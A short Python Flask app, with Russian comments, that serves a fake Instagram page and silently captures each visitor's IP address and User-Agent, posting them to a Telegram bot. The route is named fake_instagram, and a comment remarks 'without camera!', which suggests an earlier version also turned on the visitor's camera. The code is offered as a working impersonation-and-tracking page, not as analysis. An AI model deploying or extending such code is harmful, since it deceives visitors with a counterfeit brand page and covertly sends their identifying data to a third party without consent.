from flask import Flask, request, render_template
import requests
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

@app.route('/')
def fake_instagram():
    # Получаем данные о посетителе
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    # Отправляем уведомление в Telegram
    message = f"🔍 Кто-то зашел на тестовую страницу:\nIP: {user_ip}\nUser-Agent: {user_agent}"
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": message}
    )

    # Рендерим фейковую страницу (без камеры!)
    return render_template("instagram.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)  # Render использует порт 10000
